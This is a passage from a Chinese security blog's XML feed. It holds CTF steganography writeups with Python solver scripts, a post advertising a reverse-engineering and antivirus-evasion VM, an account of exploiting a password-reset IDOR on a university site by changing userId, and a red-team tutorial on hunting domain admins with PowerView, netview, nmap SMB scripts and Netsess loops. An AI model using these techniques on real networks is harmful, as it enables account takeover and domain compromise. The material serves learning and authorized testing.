title="misc45"></a>misc45</h2><blockquote><p>有时候也需要换一换思维格式</p></blockquote><p>不做了不做了（手动滑稽</p><h2 id="misc46"><a href="#misc46" class="headerlink" title="misc46"></a>misc46</h2><blockquote><p>你见过扶乩吗</p></blockquote><p>利用工具 ImageMagick 得到每帧的偏移量，然后将它作为坐标来画图,写个脚本跑一下即可得到flag：ctfshow{05906b3be8742a13a93898186bc5802f}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210406145817589.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;46.txt&#x27;</span>)</span><br><span class="line">pp = []</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    c = f.readline()</span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        s = <span class="built_in">eval</span>(c.split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>]+<span class="string">&#x27;,&#x27;</span>+c.split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">2</span>][:<span class="number">2</span>])</span><br><span class="line">        pp.append(s)</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="comment"># print(c)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">400</span>,<span class="number">70</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pp:</span><br><span class="line">    new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    img.paste(new,i)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="misc47"><a href="#misc47" class="headerlink" title="misc47"></a>misc47</h2><blockquote><p>没见过扶乩，那你知道笔仙吗</p></blockquote><p>原理同上，只是这里换成了apng，跑下脚本得到flag：ctfshow{6d51f85b45a0061754a2776a32cf26c4}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4647123456456474647.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;misc47.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = c[c.index(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;6663544C00000001&#x27;</span>)):]</span><br><span class="line">pp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1124</span>,<span class="number">2</span>):</span><br><span class="line">    start = c.index(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;6663544C0000&#x27;</span>)+struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>,i))</span><br><span class="line">    <span class="comment"># start = c.index(bytes.fromhex(&#x27;6663544C000000&#x27;+hex(i)[2:]))</span></span><br><span class="line">    <span class="comment"># print(start)</span></span><br><span class="line">    fc = c[start:start+<span class="number">30</span>]</span><br><span class="line">    print(fc[<span class="number">18</span>:<span class="number">20</span>],fc[<span class="number">22</span>:<span class="number">24</span>])</span><br><span class="line">    print(struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>,fc[<span class="number">18</span>:<span class="number">20</span>])+struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>,fc[<span class="number">22</span>:<span class="number">24</span>]))</span><br><span class="line">    pp.append(struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>,fc[<span class="number">18</span>:<span class="number">20</span>])+struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>,fc[<span class="number">22</span>:<span class="number">24</span>]))</span><br><span class="line">    <span class="comment"># print(fc.index(b&#x27;\xb6&#x27;),fc.index(b&#x27;\x34&#x27;))</span></span><br><span class="line"><span class="comment"># print(c[:100])</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">400</span>,<span class="number">70</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pp:</span><br><span class="line">    new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    img.paste(new,i)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="misc48"><a href="#misc48" class="headerlink" title="misc48"></a>misc48</h2><blockquote><p>附件的第（Di）七（Qi）题（Ti）中有提示。本题略脑洞，可跳过</p></blockquote><p>不做了不做了（手动滑稽</p><h2 id="misc49"><a href="#misc49" class="headerlink" title="misc49"></a>misc49</h2><blockquote><p>它们一来就是十六种。本题略脑洞，可跳过</p></blockquote><p>不做了不做了（手动滑稽</p><h1 id="图片篇-颜色通道"><a href="#图片篇-颜色通道" class="headerlink" title="图片篇(颜色通道)"></a>图片篇(颜色通道)</h1><h2 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h2><blockquote><p>有时候视线也要放低一点</p></blockquote><p>steg打开在红绿蓝三个通道中找到flag：ctfshow{84470883ee1eec2e886436461bf79111}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5555505214874996.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/516264210055156.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/51522674780005555.png"></p><hr><p>待续….</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mar.DASCTF 2021</title>
      <link href="2021/03/28/2021Mar.DASCTF/"/>
      <url>2021/03/28/2021Mar.DASCTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：😔早上七点就起床爬去练车练了一整天，让同学先帮忙下了Misc的附件</p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><blockquote><p>签到，请关注公众号，并以语音的方式用普通话喊出“异世相遇，尽享美味，安恒赛高。”，即可拿到 flag。提交时请提交括号内的内容。</p><p><a href="https://pan.baidu.com/s/15hqkNXUTPYxp5WdH0fqfAw"><strong>附件</strong></a>（提取码：dp67）</p></blockquote><p>回复即可获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/@NLH_D%7B%5D_J_138@%7B5_%60EO$I.png"></p><h2 id="简单的png隐写"><a href="#简单的png隐写" class="headerlink" title="简单的png隐写"></a>简单的png隐写</h2><blockquote><p>简单的png隐写</p><p><a href="https://pan.baidu.com/s/1wGwXy7Lnx4IDUNdlLc-XRg"><strong>附件</strong></a>（提取码：yf5q）</p></blockquote><p>不难看出是伪加密即09-&gt;00；得到两张图</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/flag.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hint.png"></p><p>010打开hint.png检测发现缺块</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/55464625153588.png"></p><p>补齐得到</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5154688979489.png"></p><p>根据提示outguess得到如下信息</p><blockquote><p>MUY4QjA4MDg5MTgwNzg1RTAwMDM2NjZDNjE2NzJFNzQ3ODc0MDA0QkNCNDk0Q0FGMzZCMDMwMzQ0RDM1NDlCNjRDMzMzNTMzMzRCMTQ4MzVCNzQ4NEEzNTMzNDg0OTMyMzU0QjRFMzUzMTQ5MzFCNUFDRTVFMjAyMDA0NjhCMjIzRjI4MDAwMDAw</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/H0@R3Z%7B$6%5BS3DR382HFT_PW.png"></p><p>最终解得flag：flag{0815e4c9f56148e78be60db56ce44d59}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gchq.github.io&#x2F;CyberChef&#x2F;#recipe&#x3D;From_Base64(&#39;A-Za-z0-9%2B&#x2F;%3D&#39;,true)From_Hex(&#39;Auto&#39;)Gunzip()&amp;input&#x3D;TVVZNFFqQTRNRGc1TVRnd056ZzFSVEF3TURNMk5qWkROakUyTnpKRk56UTNPRGMwTURBMFFrTkNORGswUTBGR016WkNNRE13TXpRMFJETTFORGxDTmpSRE16TXpOVE16TXpSQ01UUTRNelZDTnpRNE5FRXpOVE16TkRnME9UTXlNelUwUWpSRk16VXpNVFE1TXpGQ05VRkRSVFZGTWpBeU1EQTBOamhDTWpJelJqSTRNREF3TURBdw</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/95578784815422.png"></p><p>待续…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>真香系列-个人逆向虚拟机分享</title>
      <link href="2021/03/26/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-%E4%B8%AA%E4%BA%BA%E9%80%86%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%86%E4%BA%AB/"/>
      <url>2021/03/26/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-%E4%B8%AA%E4%BA%BA%E9%80%86%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>在此之前我分享过一个pwn的虚拟机，粉丝回馈说很不错！，那么今天我就把我平时进行逆向分析和免杀的虚拟机分享出来，继续延续真香系列。</p><h2 id="2-效果截图"><a href="#2-效果截图" class="headerlink" title="2.效果截图"></a>2.效果截图</h2><p>因为平时也没咋做逆向分析，一般都在此虚拟机中编译免杀工具，进行免杀探索，所以工具不是很齐全，但是应该足够了。</p><h3 id="2-1反汇编调试软件"><a href="#2-1反汇编调试软件" class="headerlink" title="2.1反汇编调试软件"></a>2.1反汇编调试软件</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%871.png"></p><p>我觉得不错的基本上都有。</p><h3 id="2-2PE工具"><a href="#2-2PE工具" class="headerlink" title="2.2PE工具"></a>2.2PE工具</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%872.png"></p><p>平时自己能用到的就这么多了</p><h3 id="2-3加壳工具"><a href="#2-3加壳工具" class="headerlink" title="2.3加壳工具"></a>2.3加壳工具</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%873.png"></p><h3 id="2-4脱壳工具"><a href="#2-4脱壳工具" class="headerlink" title="2.4脱壳工具"></a>2.4脱壳工具</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%874.png"></p><p>听说高手脱壳这方面就用od，ida搞定。</p><h3 id="2-5-其他工具"><a href="#2-5-其他工具" class="headerlink" title="2.5 其他工具"></a>2.5 其他工具</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%875.png"></p><h3 id="2-6桌面预览"><a href="#2-6桌面预览" class="headerlink" title="2.6桌面预览"></a>2.6桌面预览</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%876.png"></p><p>如果觉得壁纸不错的，那说明品位确实不错！</p><h2 id="3-说明"><a href="#3-说明" class="headerlink" title="3.说明"></a>3.说明</h2><p>最近和lengyi师傅筹建了一个Redteamspace 知识星球，此星球是主要是为了探讨前沿的红队技术，以及一些不为人所知的骚姿势，营造一个良好的学习氛围，如果你与我们一样热爱技术，善于分享，那么请加入我们吧！</p><p>此逆向虚拟机也将放入星球中，开机密码也将在星球中公布，最后红队yyds。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%877.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF 欢乐个人赛 2021</title>
      <link href="2021/03/21/2021NepCTF/"/>
      <url>2021/03/21/2021NepCTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>👴是懒狗！都很忙最近就没怎么打</p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="我是间谍2nd"><a href="#我是间谍2nd" class="headerlink" title="我是间谍2nd"></a>我是间谍2nd</h2><blockquote><p>坏女人往我的u盘里偷偷放了一个程序，你能找出她干了什么吗？remember: try to forgery ip,but not to reverse it.</p><p><a href="https://pan.baidu.com/s/1v68XQW5PjXKaC9lWinChqQ">附件</a>（提取码：2qdt）</p></blockquote><p>不会啊.jpg</p><h2 id="出题人日记"><a href="#出题人日记" class="headerlink" title="出题人日记"></a>出题人日记</h2><blockquote><p>我把茶包的出题日记找到了，里面居然有！！！</p><p><a href="https://pan.baidu.com/s/1SfmX_QMI3YKvp3NfcTl3aA">附件</a>（提取码：1elt）</p></blockquote><p>打开查阅发现第十八天处有flag的踪影</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/HH%5BP%7DY_14G%7BX5%7D13J0NOO28.png"></p><p>将其excel以压缩包的方式打开发现了个hint并找到fufufufufufufufufuufufufufufufufufufufufufufufufufu.flag（png</p><blockquote><p>hint:<br>隐写.wf pna fbyir guvf ceboyrz</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/PPZ[[7FCAZW$HU3DAFIS%U5.png"></p><p>最后通过以下项目得到flag</p><p><a href="https://www.peter-eigenschink.at/projects/steganographyjs/showcase/">https://www.peter-eigenschink.at/projects/steganographyjs/showcase/</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/flag.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NepCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次对某大学的逻辑漏洞</title>
      <link href="2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<blockquote><p>震惊！JOJO师傅又日站惹！</p></blockquote><p>闲来无事，随便在某fa里面找找一个edu站点，看看谁是今天的幸运儿呢？</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1499855574.png"></p><p>好家伙就你了，虽然不属于教育网，但是我认为你应该是（QAQ）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/44321155564.png"></p><p>进入网页；Footer</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/12444356.png"></p><p>还敢说你不是常威（大学）？开干！</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5554884765.png"></p><p>二话不说，直接注册，因为有注册，测试的功能就比较多<br>注册了一个账号（test/admin123）,然后登陆</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/111654875455.png"></p><p>欸，怎么回事，我以为站已经没了，准备放弃的时候，我返回一步，点了个首页</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/511222649.png"></p><p>这他喵的不是登上了吗？</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/618618774.png"></p><p>很快啊，看见有传头像的地方，上去就是burpsuite，干他丫的！</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/61224566131.png"></p><p>知道作者头像为什么是错误的吗，是因为我文件上传绕过失败了。知道我为什么电话不打码吗，因为是我前女友的。（开玩笑了，乱输的，这也算个任意用户注册的洞吧）我真是淦了。失败过程就不放出来了，我怕大佬笑我！555<br>我菜，我不要webshell了不行吗，然后edusrc对XSS很不友好，<br>Xss不要罢了，菜我就挖逻辑漏洞！<br>尝试修改密码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/145512436.png"></p><p>看抓包能抓到我们想要的参数吗<br>一直抓包forward，第一个包是校验test的密码，直到出现下图为止<br>看见password=我们要修改的密码 的时候</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/444665757.png"></p><p>嘿，它出来了，应该可以遍历userId来修改任意用户密码。改改就完事（已知另一个测试账号为test1/admin456, 107254）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/24245512424.png"></p><p>激动的手点点forward</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/75225744123.png"></p><p>这不得起飞咯~登陆test1看看<br>抓包可以看见密码是修改后的admin1234</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4040123456.png"></p><p>成功登陆。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/14145201314250.png"></p><p>我这种菜鸡才挖逻辑漏洞。已交给edusrc。</p><p>心细得天下！！！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网基础-定位域管理员</title>
      <link href="2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"/>
      <url>2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/</url>
      
        <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​    在域渗透中，需要对有目的性的渗透，快速控制一个域最快的办法（不包括直接利用提升为域管的漏洞）就是拿到域管理员的hash，然后对域控进行dcsync，拿到域内所有成员的hash，那么我们如何定位域管理员在哪台机器上登录过？</p><p>当然窃取凭据域管理员进程也是一个不错的选择！</p><p>1.通过net group “domain admins” /domain 列出域管理员组成员</p><p>2.通过tasklist /v 列出本地进程的所有者</p><p>3.进行交叉处理，找到域管理进程</p><p>通过域搭建的原理来看，在机器加入域之后，域管理员组成员会自动加入到本地的管理员组。</p><p>定位域管理员的常规渠道：</p><p>1.日志（本地管理员日志）</p><p>2.会话（域内每台机器的登陆回话）</p><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><h3 id="psloggedon-exe"><a href="#psloggedon-exe" class="headerlink" title="psloggedon.exe"></a>psloggedon.exe</h3><p>这是微软的自带的pstool工具包的一个非常实用的工具，其原理为检查注册表HKey_USER项的key来查询，会调用NetSession api,所以有些功能需要管理员权限。</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psloggedon 要列出登陆信息的机器名或者用户名#如果没有填 则默认为本地</span><br><span class="line">如果指定用户名，则会搜索次用户登陆过哪些机器</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">描述</th><th></th></tr></thead><tbody><tr><td align="left">-</td><td>显示支持的选项和用于输出值的度量单位</td></tr><tr><td align="left">-l</td><td>仅显示本地登录，而不显示本地和网络资源登录</td></tr><tr><td align="left">-x</td><td>不显示登录时间</td></tr><tr><td align="left">\computername</td><td>指定要为其列出登录信息的计算机的名称</td></tr><tr><td align="left">username</td><td>指定用户名，在网络中搜索该用户登陆的计算机</td></tr></tbody></table><p>配合net localgroup administrators 找到域管登陆过的机器</p><h3 id="PVEFindaduser-exe"><a href="#PVEFindaduser-exe" class="headerlink" title="PVEFindaduser.exe"></a>PVEFindaduser.exe</h3><p>用于查找AD用户的登录位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。</p><p>命令；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe -current#将获取域内所有计算机上当前登陆的所有用户</span><br><span class="line">结果保存到report.csv文件</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">-last</td><td align="left">将获取目标计算机的最后一个登陆用户</td></tr><tr><td align="left">-target</td><td align="left">指定要查询的计算机。</td></tr><tr><td align="left">-current [“username”]</td><td align="left">-current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC</td></tr><tr><td align="left">-noping</td><td align="left">阻止尝试枚举用户登录名之前对目标计算机执行ping命令</td></tr><tr><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="netview-exe"><a href="#netview-exe" class="headerlink" title="netview.exe"></a>netview.exe</h3><p>netview.exe是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户，netview.exe还可以查询共享入口和有价值的用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netview.exe &lt;参数&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>-h</th><th>显示帮助信息</th></tr></thead><tbody><tr><td>-f</td><td>filename.txt:指定要提取主机列表的文件</td></tr><tr><td>-e</td><td>filename.txt:指定要排除的主机名的文件</td></tr><tr><td>-o</td><td>filename.txt:将所有输出重定向到指定的文件</td></tr><tr><td>-d</td><td>filename.txt:指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表</td></tr><tr><td>-g</td><td>group:指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</td></tr><tr><td>-c</td><td>对已找到的共享目录/文件的访问权限进行检查</td></tr></tbody></table><h3 id="nmap-脚本"><a href="#nmap-脚本" class="headerlink" title="nmap 脚本"></a>nmap 脚本</h3><p>可以使用nmap的<code>smb-enum-sessions.nse</code>引擎获取远程主机的登陆会话（不需要管理员权限）</p><h4 id="其他域渗透脚本："><a href="#其他域渗透脚本：" class="headerlink" title="其他域渗透脚本："></a>其他域渗透脚本：</h4><p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p><p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆</p><p><code>smb-enum-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><h3 id="Powerview脚本"><a href="#Powerview脚本" class="headerlink" title="Powerview脚本"></a>Powerview脚本</h3><p>主要涉及到定位关键用户的功能如下两个模块</p><ul><li>Invoke-StealthUserHunter:只需要进行一次查询，就可以获取域里面的所有用户，使用方法为，从<code>user.HomeDirectories</code>中提取所有用户，并对没太服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对没太机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就使用<code>Invoke-UserHunter</code></li><li>Invoke-UserHunter:找到域内特定的用户群，接受用户名、用户了表和域组查询，接收一个主机列表或查询可用的主机域名。可以使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用NetSessionEnum和NetWkstaUserEnumAPI)扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限，在本地执行该脚本</li></ul><h3 id="Empire-模块"><a href="#Empire-模块" class="headerlink" title="Empire 模块"></a>Empire 模块</h3><p>Empire 模块中也有功能和invoke-userhunter一样的模块，user_hunter，Empire我平时也不咋用，还得反弹shell到Empire属实有点麻烦，了解了解就行。</p><p>实际的域里面，大规模的枚举是会惊动ids等防护设备的</p><p>介绍完工具再来说说手动：</p><h3 id="手工配合Netsess筛选数据"><a href="#手工配合Netsess筛选数据" class="headerlink" title="手工配合Netsess筛选数据"></a>手工配合Netsess筛选数据</h3><p>首先收集域控列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group “Domain Controllers” &#x2F;domain</span><br><span class="line">Nslookup –type&#x3D;SRV _ldap._tcp</span><br><span class="line">。。。。。。。。</span><br></pre></td></tr></table></figure><p>收集域管列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group “Domain Admins” &#x2F;domain</span><br></pre></td></tr></table></figure><p>通过Netsess.exe查询每个域控制器，收集所有活动域会话的列表</p><p>Netsess.exe -help #获取帮助</p><p>   -full          Full session info (requires admin)<br>   -h servername  Alternate method to specify server<br>   -u username    Username to filter for<br>   -c client name Alternate method to specify client name</p><p>cmd联合命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR &#x2F;F %i in (dc.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR &#x2F;F %a in (domain_admins.txt) DO @type sessions.txt | @findstr &#x2F;I %a</span><br></pre></td></tr></table></figure><p>Dc.txt为收集的域控制器列表，domain_admins.txt为收集的域管列表</p><h3 id="Get-NetLocalGroupMember-枚举远程计算机本地组"><a href="#Get-NetLocalGroupMember-枚举远程计算机本地组" class="headerlink" title="Get-NetLocalGroupMember 枚举远程计算机本地组"></a>Get-NetLocalGroupMember 枚举远程计算机本地组</h3><p>安装Recon模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy -ExecutionPolicy Bypass</span><br><span class="line">import-module .\Recon.psd1</span><br></pre></td></tr></table></figure><p>指定远程计算机，指定枚举管理员组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetLocalGroupMember -ComputerName 主机名 -GroupName administrators </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-信息收集</title>
      <link href="2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
